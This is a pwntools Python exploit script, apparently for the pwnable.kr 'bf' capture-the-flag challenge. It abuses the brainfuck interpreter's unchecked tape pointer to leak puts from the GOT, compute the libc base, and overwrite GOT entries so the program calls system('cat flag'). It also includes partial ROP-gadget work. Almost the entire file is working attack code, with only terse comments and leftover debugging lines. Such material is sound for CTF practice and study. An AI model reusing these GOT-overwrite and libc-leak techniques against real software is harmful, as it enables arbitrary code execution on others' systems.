from pwn import *

context.update(arch="i386", os="linux")

# Logging
log.info("Start pwning...")

#ELF_NAME = "./ctf-bf"
#ELF_NAME = "./bf"
# Load executable
#exe = ELF("./bf")
#exe = ELF(ELF_NAME)

# Libc
libc = ELF("./libc.so.6")
#libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb
#libc_base = 0xf7e1b000 # Bf local one
#libc_base = 0xf7d73000 # TODO - re-adjust base - I changed it cuz of gdb
#libc_base = 0xf7d73000 # The original base
#libc_base = 0xf7df8000 # The original base
#libc_base = 0xf7e0a000 # TODO - re-adjust base - I changed it cuz of gdb
#libc.address = libc_base
puts_addr = p32(next(libc.search(b"puts")))
#execve_addr = p32(next(libc.search(b"libc_system")))

#print(f"DUMP: {my_rop.dump()}")
# Start process
conn = process("./bf")
#conn = process("./ctf-bf")
#conn = remote("pwnable.kr",9001)
print(conn.recvline()) # main massage
print(conn.recvline()) # main massage
#conn = process(ELF_NAME)

with open("payload", "w") as f:
    f.write("")
# 1st part - before the input - just the commands

# TODO TODAY WEDNESDAY - Add here the commoand and use ,>,>,> with and
payload = b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
payload += b".>.>.>." # leak the address of puts 
payload += b"<<<" # reset to tape
payload += b">" * 24 #move to putchar
payload += b",>,>,>," # getchar - setting putchar GOT
payload += b">" * 109 # move to tape addr
payload += b"[" # write command ls -l into tape
payload += b",>,>,>,>,>,>,>," # write command into tape - 8 bytes
payload += b"<" * 116 # go back
payload += b"." # trigger char
payload += b"\n" # call to puts()
conn.send(payload)
print(payload)

the_output = conn.recvn(4) # leaking address of puts
print(f"OUTPUT: {the_output}")

# 2nd part - the input to write ( the function to jump to )
with open("payload", "wb+") as f:
    f.write(payload)
# separate sends cuz of annoying encoding / decoding issue with p32() and
#pasted
with open("output", "wb") as a:
    a.write(the_output)

puts_addr = unpack(the_output, endian='little')
print(f"puts addr: {puts_addr}") # receive until newline
print(f"puts addr: {hex(puts_addr)}") # receive until newline
puts_distance_from_libc = 392368
print(f"distance: {puts_distance_from_libc}")
print(f"distance: {libc.symbols['puts']}")
libc_base = puts_addr - puts_distance_from_libc
print(f"libc addr: {libc_base}") # receive until newline
print(f"libc addr: {hex(libc_base)}") # receive until newline
libc.address = libc_base
system_addr = libc.symbols["system"]
execve_addr = libc.symbols["execve"]
putchar_addr = libc.symbols["putchar"]
print(f"system_addr: {str(hex(system_addr))}")
print(f"putchar: {str(hex(putchar_addr))}")

# I'm going to bulid a ROP chain here in the heap!
heap_arbitrary_addr = 0x804b0a7
heap_rop_nop = libc_base
print(f"heap nop rop : {hex(heap_rop_nop)}")
#payload =my_rop
fgets_addr_in_main = 0x8048734
memset_addr_in_main = 0x8048700
pop_ebx = libc_base
# 2nd program iteration - 1st half
null_addr = 0x804b20c
tape_addr = 0x0804a0a0 # tape is our heap var with command string
payload = p32(memset_addr_in_main)
#payload += p32(system_addr)
#payload += p32(tape_addr)
#payload += p32(pop_ebx)
payload += b"cat flag" # argument for system - tape wil be filled with this
payload += p32(0x22222222)
payload += p32(0x33333333)
payload += p32(0x44444444)
payload += p32(system_addr) # program will execute this instead of puts
main_ret_addr = 0x804878E
exit_addr = libc.symbols['exit']
print(f"exit: {hex(exit_addr)}")
payload += p32(exit_addr) # program will jump here
payload += p32(tape_addr)
payload += p32(0x44444444)
payload += b"<"  * 27# decrease from putchar() GOT to puts() GOT address
payload += b",>,>,>," # Setting the puts() GOT address
payload += b"[" # Calling the puts()
payload += b"\n"
 # we can replace the address of memset with the address of system!
conn.sendline(payload)
with open("payload", "ab+") as f:
    f.write(payload)

# 2nd program iteration - 2nd half
add_esp = libc_base + 0x0005b980 # pop ecx pop edx-1st pop to get rid of [ str
add_esp = libc_base + 0x000bd5da # stack has changed
print(f"add esp addr: {hex(add_esp)}")
payload = p32(add_esp) # the ADD ESP ROP address
payload += b"BBBB" # jump to memset() line
#payload += p32(0x8048700) # jump to memset() line
#payload += p32(0x22334455) # jump to memset() line
payload += b"\n" # call to puts()
conn.sendline(payload)


with open("payload", "ab+") as f:
    f.write(payload)

print(payload)
